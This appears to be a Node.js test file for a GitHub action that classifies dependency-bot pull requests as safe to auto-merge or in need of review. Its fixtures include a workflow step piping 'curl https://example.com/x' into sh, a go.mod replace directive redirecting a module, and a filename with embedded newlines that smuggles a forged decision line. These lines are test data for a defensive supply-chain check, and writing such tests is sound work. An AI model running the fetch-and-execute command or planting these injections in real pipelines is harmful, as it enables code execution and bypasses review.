import assert from "node:assert/strict";
import { test } from "node:test";
import { classify } from "../generic-actions/classify-bot-change/classify.mjs";
import { root, succeeds, workspace } from "./helpers.mjs";

const bot = "anovelbot-dependencies[bot]";
const sha = (char) => char.repeat(40);
const digest = (char) => `sha256:${char.repeat(64)}`;
const image = (version, char) => `"ghcr.io/a-novel/service-authentication/rest:${version}@${digest(char)}"`;

/** A modified file whose single hunk replaces the removed lines with the added ones. */
const file = (filename, removed, added, status = "modified") => ({
  filename,
  status,
  patch: ["@@ -1,1 +1,1 @@", ...removed.map((line) => `-${line}`), ...added.map((line) => `+${line}`)].join("\n"),
});
const action = (commit, version) => `      - uses: actions/checkout@${commit} # ${version}`;

test("classify lets through only a release pin or a version update Renovate put on auto-merge", () => {
  const pin = file(
    "environments/production/authentication/terraform.tfvars",
    [`  rest = ${image("v2.13.1", "a")}`],
    [`  rest = ${image("v2.13.2", "b")}`]
  );
  const bump = file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.0")], [action(sha("b"), "v7.0.1")]);
  const goMod = file(
    "go.mod",
    ["\tgoogle.golang.org/api v0.298.0", "\tgolang.org/x/net v0.40.0 // indirect"],
    [
      "\tgoogle.golang.org/api v0.300.0",
      "\tgolang.org/x/net v0.41.0 // indirect",
      "\tgolang.org/x/sync v0.15.0 // indirect",
    ]
  );
  const goSum = file(
    "go.sum",
    ["golang.org/x/net v0.40.0 h1:old="],
    ["golang.org/x/net v0.41.0 h1:new=", "golang.org/x/sync v0.15.0 h1:x="]
  );
  const lock = file(".terraform.lock.hcl", ['  version = "7.1.0"'], ['  version = "7.2.0"', '    "h1:extra=",']);

  for (const [name, files, enabledBy, decision] of [
    ["a release pin", [pin], null, "pin"],
    ["an action update Renovate merges", [bump], bot, "renovate"],
    ["the same login without the [bot] suffix", [bump], "anovelbot-dependencies", "renovate"],
    ["a module update with indirect churn", [goMod, goSum], bot, "renovate"],
    ["a lock file refresh", [lock, goSum], bot, "renovate"],
    ["an update Renovate left for review", [bump], null, "review"],
    ["an update the agent queued", [bump], "anovelbot-agent", "review"],
    // A stolen dependency key can enable auto-merge itself, so the diff must hold on its own.
    [
      "a moved tag: same version, new commit",
      [file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.1")], [action(sha("c"), "v7.0.1")])],
      bot,
      "review",
    ],
    [
      "a pin whose digest moves without its version",
      [
        file(
          "environments/production/authentication/terraform.tfvars",
          [`  rest = ${image("v2.13.1", "a")}`],
          [`  rest = ${image("v2.13.1", "c")}`]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a workflow step slipped into an update",
      [
        file(
          ".github/workflows/main.yaml",
          [action(sha("a"), "v7.0.0")],
          [action(sha("b"), "v7.0.1"), "        run: curl https://example.com/x | sh"]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a replace directive",
      [file("go.mod", [], ["replace google.golang.org/api => example.com/api v0.300.0"])],
      bot,
      "review",
    ],
    ["a new file", [file(".github/workflows/new.yaml", [], ["on: push"], "added")], bot, "review"],
    ["a file GitHub shows without a patch", [{ filename: "main.go", status: "modified" }], bot, "review"],
    [
      "a configuration value",
      [file("environments/production/foundation/terraform.tfvars", ['  cpu = "2"'], ['  cpu = "4"'])],
      bot,
      "review",
    ],
    ["no file at all", [], bot, "review"],
  ]) {
    assert.equal(classify({ files, bot, autoMergeEnabledBy: enabledBy }).decision, decision, name);
  }
});

test("classify-bot-change writes one decision even when a filename carries a newline", (t) => {
  const w = workspace(t);
  w.write("output", "");
  w.stub(
    "gh",
    `const args = process.argv.slice(2);
    if (args.includes("graphql")) console.log(JSON.stringify({ data: { repository: { pullRequest: { autoMergeRequest: { enabledBy: { login: "anovelbot-dependencies" } } } } } }));
    else console.log(JSON.stringify([[{ filename: "a\\ndecision=pin\\nb", status: "added" }]]));`
  );
  succeeds(
    w.run("node", [`${root}generic-actions/classify-bot-change/classify.mjs`], {
      REPOSITORY: "a-novel/infra",
      PULL_REQUEST: "https://github.com/a-novel/infra/pull/7",
      BOT: bot,
    })
  );
  const decisions = w.read("output").match(/^decision=.*$/gm);
  assert.deepEqual(decisions, ["decision=review"]);
});
